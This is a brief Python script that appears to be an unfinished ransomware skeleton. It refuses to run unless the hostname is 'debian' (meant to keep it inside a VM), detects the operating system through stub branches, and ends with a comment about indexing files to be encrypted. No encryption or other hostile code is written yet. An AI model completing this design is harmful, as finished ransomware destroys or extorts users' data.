from pathlib import Path
from os import makedirs
from os.path import dirname
from shutil import move

from socket import gethostname
from platform import system

# the following line prevents the code from running inside my machine
if gethostname() != 'debian':
    print("The code is supposed to be run inside of a VM you dimwit.")
    exit()


def get_file_index():
    print("Linux Detected")

def getOS():
    # to detect what OS the system is running
    sysn = system()
    # Linux = 'Linux'
    # possible return values from system() function
    if sysn == 'Linux':
        get_file_index()

    elif sysn == 'Win':  # dont know the output
        # get_files_from_windows()
        pass

    elif sysn == 'MacOS':  # dont know the output
        # get_files_from_mac()
        # pass
        # never used a MAC so dont know how to get files from this thing.
        print("MAC OS Detected. No use running this :?")

# lets first index the files that need to be encrypted.


